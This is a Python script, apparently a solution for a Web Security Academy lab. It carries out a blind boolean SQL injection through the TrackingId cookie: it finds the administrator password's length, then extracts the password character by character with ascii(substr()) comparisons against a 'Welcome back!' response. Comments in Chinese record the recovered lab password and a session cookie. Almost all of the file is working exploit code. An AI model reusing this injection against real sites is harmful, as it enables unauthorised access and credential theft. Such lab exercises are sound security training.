import requests
import string

url = 'https://ac411f511f1a5ffcc0d2146d00e10090.web-security-academy.net/filter?category=Toys+%26+Games'

# password length 20
# 確認一下 password 的長度
def checkLength():
    for i in range(0, 50):
        payload = '''' union select password from users where username = 'administrator' and length(password) = {} -- -'''.format(
            str(i))

        response = requests.get(url, cookies={
            'TrackingId': payload,
            'session': 'DFmXmf0PiwapuiW3QKeulBMHA3ZArgnU'
        })

        print(payload)
        if 'Welcome back!' in response.text:
            print(i)
            break

# 拿 password 
# password atqxv3ujnto95o6o7smf
def getPassword():
    password = ''
    for i in range(1, 21):
        for j in string.printable:
            payload = '''' union select password from users where username = 'administrator' and ascii(substr(password,{},1)) = {} -- -'''.format(str(i), ord(str(j)))

            response = requests.get(url, cookies={
                'TrackingId': payload,
                'session': 'DFmXmf0PiwapuiW3QKeulBMHA3ZArgnU'
            })

            print(payload)
            if 'Welcome back!' in response.text:
                password += j
                print(password)
                break

checkLength()
getPassword()

# 測試一下 payload 能不能用
# response = requests.get(url, cookies={
#     'TrackingId': '''' union select password from users where username = 'administrator' and ascii(substr(password,1,1)) > 48 -- -''',
#     'session': 'DFmXmf0PiwapuiW3QKeulBMHA3ZArgnU'
# })

# print(response.text)
